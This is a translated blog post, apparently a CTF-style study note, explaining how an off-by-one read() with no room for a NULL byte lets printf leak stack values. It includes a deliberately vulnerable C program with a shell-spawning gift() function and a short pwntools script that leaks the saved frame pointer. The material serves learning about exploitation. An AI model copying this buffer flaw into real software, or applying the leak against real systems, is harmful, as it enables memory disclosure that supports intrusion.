---
title: "[PWNABLE] Off_By_One"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique that was also used when dealing with canary leaks. https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary bypass※ Please let me know if there are any mistakes."
date: "2024-06-24"
translation_key: "tistory-d43d36c81946"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-OffByOne"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

This is a technique that was also used when dealing with canary leaks.

[https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C](https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C)

 [\[PWNABLE\] Canary bypass

※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (just a simple explanation)

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C)

It is one of the most used friends when leaking values such as stack, pie\_base, and libc\_base as well as canary.

In general, functions such as printf() continue to attempt to print a string until a NULL Byte (\\x00) is encountered.

At this time, if there is no NULL Byte before the value to be leaked, the memory address is leaked by printf().

Let’s take a look at a simple example below.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
	printf("Hello! ZZoMblE");
	system("/bin/sh");
}
void initialize() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
	char buf[128];
	printf("input : ");

	read(0,buf,128);
	printf("%s",buf);

}
int main() {
	initialize();
	vuln();
	return 0;
}
```

If you look at it at a glance, you won't be able to find any major vulnerabilities.

The vulnerable part here is that when the value is received through read(), the input is received in the same size as the string buf. In other words, NULL Bytes must exist in the string, but if all string buffers are filled, there will be no space for NULL Bytes to exist.

![](/assets/images/tistory/tistory-d43d36c81946/001.png)

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

context.log_level = 'debug'

payload = b'a'*128
p.sendafter(b':', payload)

p.interactive()
```

I used debug mode to check for memory value leaks.

![](/assets/images/tistory/tistory-d43d36c81946/002.png)

You can confirm that the sfp of vuln() has become leaked.